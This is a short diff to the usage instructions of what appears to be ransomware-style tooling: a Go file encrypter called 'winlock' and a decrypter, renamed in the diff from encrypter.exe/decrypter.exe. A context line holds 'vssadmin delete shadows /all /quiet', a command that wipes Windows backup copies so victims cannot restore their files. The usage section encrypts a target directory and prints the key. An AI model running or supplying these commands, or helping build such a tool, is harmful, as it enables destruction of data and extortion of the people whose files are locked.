@@ -107,18 +107,18 @@ cmd.exe /c vssadmin delete shadows /all /for=c: /quiet
 ```bash
 # build encrypter
 cd winlock
-go build -o encrypter.exe
+go build -o winlock.exe
 
 # build decrypter  
 cd ../dec
-go build -o decrypter.exe
+go build -o winunlock.exe
 ```
 
 ### encryption
 
 ```bash
 # encrypt directory (prints hex key to stdout)
-.\encrypter.exe -path "C:\target\directory"
+.\winlock.exe -path "C:\target\directory"
 
 # example output:
 # f40773ae66dde5d1631e193a967182829f217e708e35ae6191dddc104da66a9c
